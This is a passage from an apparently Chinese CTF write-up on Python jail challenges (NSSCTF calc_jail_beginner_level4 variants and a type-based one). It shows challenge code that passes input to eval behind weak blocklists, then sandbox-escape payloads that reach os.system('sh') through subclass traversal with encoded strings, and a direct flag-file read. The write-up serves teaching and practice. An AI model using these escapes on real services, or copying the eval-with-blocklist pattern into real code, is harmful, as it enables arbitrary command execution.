</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">WELCOME</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Welcome to my guesser game!&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">game_score</span> <span class="o">=</span> <span class="n">guesser</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">game_score</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;you are really super guesser!!!!&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;flag{fake_flag_in_local_but_really_in_The_remote}&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Guess game end!!!&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">addaudithook</span><span class="p">(</span><span class="n">my_audit_hook</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="type-chnnel" class="headerLink">
    <a href="#type-chnnel" class="header-mark"></a>tyPe Ch@nnEl</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">MY_FLAG</span> <span class="o">=</span> <span class="s2">&#34;NSSCTF{fake_flag_in_local_but_really_in_The_remote}&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">BLACED_KLIST</span> <span class="o">=</span> <span class="s1">&#39;&#34;%&amp;</span><span class="se">\&#39;</span><span class="s1">,-/_:;@</span><span class="se">\\</span><span class="s1">`{|}~*&lt;=&gt;[] </span><span class="se">\t\n\r</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">my_safe_check</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">all</span><span class="p">(</span><span class="n">ord</span><span class="p">(</span><span class="n">m</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mh">0x7f</span> <span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">n</span><span class="p">)</span> <span class="ow">and</span> <span class="n">all</span><span class="p">(</span><span class="n">m</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">n</span> <span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">BLACED_KLIST</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">my_safe_eval</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="n">my_func</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">my_safe_check</span><span class="p">(</span><span class="n">m</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Hacker!!!!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">eval</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;{my_func.__name__}({m})&#34;</span><span class="p">,</span> <span class="p">{</span><span class="s2">&#34;__builtins__&#34;</span><span class="p">:</span> <span class="p">{</span><span class="n">my_func</span><span class="o">.</span><span class="n">__name__</span><span class="p">:</span> <span class="n">my_func</span><span class="p">},</span> <span class="s2">&#34;flag&#34;</span><span class="p">:</span> <span class="n">MY_FLAG</span><span class="p">}))</span>
</span></span><span class="line"><span class="cl">        <span class="n">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Try again!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">my_safe_eval</span><span class="p">(</span><span class="n">input</span><span class="p">(</span><span class="s2">&#34;Payload:&#34;</span><span class="p">),</span> <span class="n">type</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>侧信道注入&hellip;.没打通</p>
<h3 id="calc_jail_beginner_level4" class="headerLink">
    <a href="#calc_jail_beginner_level4" class="header-mark"></a>calc_jail_beginner_level4</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1">#No danger function,no chr,Try to hack me!!!!</span>
</span></span><span class="line"><span class="cl"><span class="c1">#Try to read file ./flag</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">BANLIST</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;__loader__&#39;</span><span class="p">,</span> <span class="s1">&#39;__import__&#39;</span><span class="p">,</span> <span class="s1">&#39;compile&#39;</span><span class="p">,</span> <span class="s1">&#39;eval&#39;</span><span class="p">,</span> <span class="s1">&#39;exec&#39;</span><span class="p">,</span> <span class="s1">&#39;chr&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">eval_func</span> <span class="o">=</span> <span class="n">eval</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">BANLIST</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">del</span> <span class="n">__builtins__</span><span class="o">.</span><span class="n">__dict__</span><span class="p">[</span><span class="n">m</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">del</span> <span class="n">__loader__</span><span class="p">,</span> <span class="n">__builtins__</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">filter</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">not_allowed</span> <span class="o">=</span> <span class="n">set</span><span class="p">(</span><span class="s1">&#39;&#34;</span><span class="se">\&#39;</span><span class="s1">`&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">any</span><span class="p">(</span><span class="n">c</span> <span class="ow">in</span> <span class="n">not_allowed</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">WELCOME</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">  _                _                           _       _ _   _                _ _  _   
</span></span></span><span class="line"><span class="cl"><span class="s1"> | |              (_)                         (_)     (_) | | |              | | || |  
</span></span></span><span class="line"><span class="cl"><span class="s1"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_ 
</span></span></span><span class="line"><span class="cl"><span class="s1"> | &#39;_ \ / _ \/ _` | | &#39;_ \| &#39;_ \ / _ \ &#39;__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _|
</span></span></span><span class="line"><span class="cl"><span class="s1"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |  
</span></span></span><span class="line"><span class="cl"><span class="s1"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_|  
</span></span></span><span class="line"><span class="cl"><span class="s1">              __/ |                          _/ |                                      
</span></span></span><span class="line"><span class="cl"><span class="s1">             |___/                          |__/                                                                                                                                             
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">WELCOME</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Welcome to the python jail&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Let&#39;s have an beginner jail of calc&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Enter your expression and I will evaluate it for you.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">input_data</span> <span class="o">=</span> <span class="n">input</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">filter</span><span class="p">(</span><span class="n">input_data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Oh hacker!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Answer: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">eval_func</span><span class="p">(</span><span class="n">input_data</span><span class="p">)))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Show subclasses with tuple：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">().__class__.__base__.__subclasses__()
</span></span><span class="line"><span class="cl">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[&#39;system&#39;](&#39;sh&#39;)
</span></span></code></pre></td></tr></table>
</div>
</div><p>但&rsquo;被ban了
**方法1：**利用bytes的ASCII list初始化方式</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[bytes([115, 121, 115, 116, 101, 109]).decode()](bytes([115, 104]).decode())
</span></span></code></pre></td></tr></table>
</div>
</div><p>**方法2：**利用<code>__doc__</code>魔术方法</p>
<p>可以从<code>__doc__</code>里面去找，用索引的方式得到想要的字符，并拼接在一起，得到我们想要的字符串。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="p">()</span><span class="o">.</span><span class="n">__doc__如下</span><span class="err">：</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s2">&#34;Built-in immutable sequence.</span><span class="se">\n\n</span><span class="s2">If no argument is given, the constructor returns an empty tuple.</span><span class="se">\n</span><span class="s2">If iterable is specified the tuple is initialized from iterable&#39;s items.</span><span class="se">\n\n</span><span class="s2">If the argument is a tuple, the return value is the same object.&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>找到对应的偏移量</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">().__doc__.find(&#39;s&#39;)
</span></span></code></pre></td></tr></table>
</div>
</div><p>得到19，然后在payload里面直接使用<code>().__doc__[19]</code>，就得到了字符<code>'s'</code></p>
<p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[()</span><span class="o">.</span><span class="vm">__doc__</span><span class="p">[</span><span class="mi">19</span><span class="p">]</span><span class="o">+</span><span class="p">()</span><span class="o">.</span><span class="vm">__doc__</span><span class="p">[</span><span class="mi">86</span><span class="p">]</span><span class="o">+</span><span class="p">()</span><span class="o">.</span><span class="vm">__doc__</span><span class="p">[</span><span class="mi">19</span><span class="p">]</span><span class="o">+</span><span class="p">()</span><span class="o">.</span><span class="vm">__doc__</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="o">+</span><span class="p">()</span><span class="o">.</span><span class="vm">__doc__</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span><span class="o">+</span><span class="p">()</span><span class="o">.</span><span class="vm">__doc__</span><span class="p">[</span><span class="mi">10</span><span class="p">]](()</span><span class="o">.</span><span class="vm">__doc__</span><span class="p">[</span><span class="mi">19</span><span class="p">]</span><span class="o">+</span><span class="p">()</span><span class="o">.</span><span class="vm">__doc__</span><span class="p">[</span><span class="mi">56</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#().__class__.__base__.__subclasses__()[-4].__init__.__globals__[&#39;system&#39;](&#39;sh&#39;)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>**方法3：**直接读flag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">open(&#39;flag&#39;).read()
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="calc_jail_beginner_level405" class="headerLink">
    <a href="#calc_jail_beginner_level405" class="header-mark"></a>calc_jail_beginner_level4.0.5</h3><p>没有源码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl">  <span class="n">_</span>                <span class="n">_</span>                           <span class="n">_</span>       <span class="n">_</span> <span class="n">_</span>   <span class="n">_</span>                <span class="n">_</span> <span class="n">_</span>  <span class="n">_</span>    <span class="n">___</span>   <span class="n">_____</span>
</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="o">|</span>              <span class="p">(</span><span class="n">_</span><span class="p">)</span>                         <span class="p">(</span><span class="n">_</span><span class="p">)</span>     <span class="p">(</span><span class="n">_</span><span class="p">)</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span>              <span class="o">|</span> <span class="o">|</span> <span class="o">||</span> <span class="o">|</span>  <span class="o">/</span> <span class="n">_</span> \ <span class="o">|</span> <span class="n">____</span><span class="o">|</span>
</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="o">|</span><span class="n">__</span>   <span class="n">___</span>  <span class="n">__</span> <span class="n">_</span> <span class="n">_</span> <span class="n">_</span> <span class="n">__</span>  <span class="n">_</span> <span class="n">__</span>   <span class="n">___</span> <span class="n">_</span> <span class="n">__</span>     <span class="n">_</span>  <span class="n">__</span> <span class="n">_</span> <span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="n">_____</span>   <span class="n">_____</span><span class="o">|</span> <span class="o">|</span> <span class="o">||</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">||</span> <span class="o">|</span><span class="n">__</span>
</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="s1">&#39;_ \ / _ \/ _` | | &#39;</span><span class="n">_</span> \<span class="o">|</span> <span class="s1">&#39;_ \ / _ \ &#39;</span><span class="n">__</span><span class="o">|</span>   <span class="o">|</span> <span class="o">|/</span> <span class="n">_</span><span class="err">`</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|/</span> <span class="n">_</span> \ \ <span class="o">/</span> <span class="o">/</span> <span class="n">_</span> \ <span class="o">|</span><span class="n">__</span>   <span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">||</span><span class="n">___</span> \
</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="p">)</span> <span class="o">|</span>  <span class="n">__</span><span class="o">/</span> <span class="p">(</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span>  <span class="n">__</span><span class="o">/</span> <span class="o">|</span>      <span class="o">|</span> <span class="o">|</span> <span class="p">(</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span>  <span class="n">__</span><span class="o">/</span>\ <span class="n">V</span> <span class="o">/</span>  <span class="n">__</span><span class="o">/</span> <span class="o">|</span>  <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="n">___</span><span class="p">)</span> <span class="o">|</span>
</span></span><span class="line"><span class="cl"> <span class="o">|</span><span class="n">_</span><span class="o">.</span><span class="n">__</span><span class="o">/</span> \<span class="n">___</span><span class="o">|</span>\<span class="n">__</span><span class="p">,</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span>\<span class="n">___</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>      <span class="o">|</span> <span class="o">|</span>\<span class="n">__</span><span class="p">,</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span>\<span class="n">___</span><span class="o">|</span> \<span class="n">_</span><span class="o">/</span> \<span class="n">___</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>  <span class="o">|</span><span class="n">_</span><span class="p">(</span><span class="n">_</span><span class="p">)</span>\<span class="n">___</span><span class="p">(</span><span class="n">_</span><span class="p">)</span><span class="n">____</span><span class="o">/</span>
</span></span><span class="line"><span class="cl">              <span class="n">__</span><span class="o">/</span> <span class="o">|</span>                          <span class="n">_</span><span class="o">/</span> <span class="o">|</span>
</span></span><span class="line"><span class="cl">             <span class="o">|</span><span class="n">___</span><span class="o">/</span>                          <span class="o">|</span><span class="n">__</span><span class="o">/</span>                                                                        
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Welcome</span> <span class="n">to</span> <span class="n">the</span> <span class="n">python</span> <span class="n">jail</span>
</span></span><span class="line"><span class="cl"><span class="n">Let</span><span class="s1">&#39;s have an beginner jail of calc</span>
</span></span><span class="line"><span class="cl"><span class="n">Enter</span> <span class="n">your</span> <span class="n">expression</span> <span class="ow">and</span> <span class="n">I</span> <span class="n">will</span> <span class="n">evaluate</span> <span class="n">it</span> <span class="k">for</span> <span class="n">you</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="n">Banned</span> <span class="n">__loader__</span><span class="p">,</span><span class="n">__import__</span><span class="p">,</span><span class="n">compile</span><span class="p">,</span><span class="n">eval</span><span class="p">,</span><span class="n">exec</span><span class="p">,</span><span class="n">chr</span><span class="p">,</span><span class="n">input</span><span class="p">,</span><span class="n">locals</span><span class="p">,</span><span class="n">globals</span> <span class="ow">and</span> <span class="err">`</span><span class="p">,</span><span class="s2">&#34;,&#39; Good luck!</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;</span> 
</span></span></code></pre></td></tr></table>
</div>
</div><p>calc_jail_beginner_level4的两种方法仍然可以用</p>
<h3 id="calc_jail_beginner_level41" class="headerLink">
    <a href="#calc_jail_beginner_level41" class="header-mark"></a>calc_jail_beginner_level4.1</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl">  <span class="n">_</span>                <span class="n">_</span>                           <span class="n">_</span>       <span class="n">_</span> <span class="n">_</span>   <span class="n">_</span>                <span class="n">_</span> <span class="n">_</span>  <span class="n">_</span>  <span class="n">__</span>
</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="o">|</span>              <span class="p">(</span><span class="n">_</span><span class="p">)</span>                         <span class="p">(</span><span class="n">_</span><span class="p">)</span>     <span class="p">(</span><span class="n">_</span><span class="p">)</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span>              <span class="o">|</span> <span class="o">|</span> <span class="o">||</span> <span class="o">|/</span><span class="n">_</span> <span class="o">|</span>
</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="o">|</span><span class="n">__</span>   <span class="n">___</span>  <span class="n">__</span> <span class="n">_</span> <span class="n">_</span> <span class="n">_</span> <span class="n">__</span>  <span class="n">_</span> <span class="n">__</span>   <span class="n">___</span> <span class="n">_</span> <span class="n">__</span>     <span class="n">_</span>  <span class="n">__</span> <span class="n">_</span> <span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="n">_____</span>   <span class="n">_____</span><span class="o">|</span> <span class="o">|</span> <span class="o">||</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span>
</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="s1">&#39;_ \ / _ \/ _` | | &#39;</span><span class="n">_</span> \<span class="o">|</span> <span class="s1">&#39;_ \ / _ \ &#39;</span><span class="n">__</span><span class="o">|</span>   <span class="o">|</span> <span class="o">|/</span> <span class="n">_</span><span class="err">`</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|/</span> <span class="n">_</span> \ \ <span class="o">/</span> <span class="o">/</span> <span class="n">_</span> \ <span class="o">|</span><span class="n">__</span>   <span class="n">_</span><span class="o">|</span> <span class="o">|</span>
</span></span><span class="line"><span class="cl"> <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="p">)</span> <span class="o">|</span>  <span class="n">__</span><span class="o">/</span> <span class="p">(</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span>  <span class="n">__</span><span class="o">/</span> <span class="o">|</span>      <span class="o">|</span> <span class="o">|</span> <span class="p">(</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span>  <span class="n">__</span><span class="o">/</span>\ <span class="n">V</span> <span class="o">/</span>  <span class="n">__</span><span class="o">/</span> <span class="o">|</span>  <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span>
</span></span><span class="line"><span class="cl"> <span class="o">|</span><span class="n">_</span><span class="o">.</span><span class="n">__</span><span class="o">/</span> \<span class="n">___</span><span class="o">|</span>\<span class="n">__</span><span class="p">,</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span>\<span class="n">___</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>      <span class="o">|</span> <span class="o">|</span>\<span class="n">__</span><span class="p">,</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span>\<span class="n">___</span><span class="o">|</span> \<span class="n">_</span><span class="o">/</span> \<span class="n">___</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>  <span class="o">|</span><span class="n">_</span><span class="p">(</span><span class="n">_</span><span class="p">)</span><span class="n">_</span><span class="o">|</span>
</span></span><span class="line"><span class="cl">              <span class="n">__</span><span class="o">/</span> <span class="o">|</span>                          <span class="n">_</span><span class="o">/</span> <span class="o">|</span>
</span></span><span class="line"><span class="cl">             <span class="o">|</span><span class="n">___</span><span class="o">/</span>                          <span class="o">|</span><span class="n">__</span><span class="o">/</span>                                                                        
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Welcome</span> <span class="n">to</span> <span class="n">the</span> <span class="n">python</span> <span class="n">jail</span>
</span></span><span class="line"><span class="cl"><span class="n">Let</span><span class="s1">&#39;s have an beginner jail of calc</span>
</span></span><span class="line"><span class="cl"><span class="n">Enter</span> <span class="n">your</span> <span class="n">expression</span> <span class="ow">and</span> <span class="n">I</span> <span class="n">will</span> <span class="n">evaluate</span> <span class="n">it</span> <span class="k">for</span> <span class="n">you</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="n">Banned</span> <span class="n">__loader__</span><span class="p">,</span><span class="n">__import__</span><span class="p">,</span><span class="n">compile</span><span class="p">,</span><span class="n">eval</span><span class="p">,</span><span class="n">exec</span><span class="p">,</span><span class="n">chr</span><span class="p">,</span><span class="n">input</span><span class="p">,</span><span class="n">locals</span><span class="p">,</span><span class="n">globals</span><span class="p">,</span><span class="n">bytes</span> <span class="ow">and</span> <span class="err">`</span><span class="p">,</span><span class="s2">&#34;,&#39; Good luck!</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;</span> 
</span></span></code></pre></td></tr></table>
</div>
</div><p>把bytes删掉了</p>
<p>Show subclasses with tuple：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">().__class__.__base__.__subclasses__()
</span></span></code></pre></td></tr></table>
</div>
</div><p>发现byte类在索引6</p>
<div class="highlight"><div class="chroma">
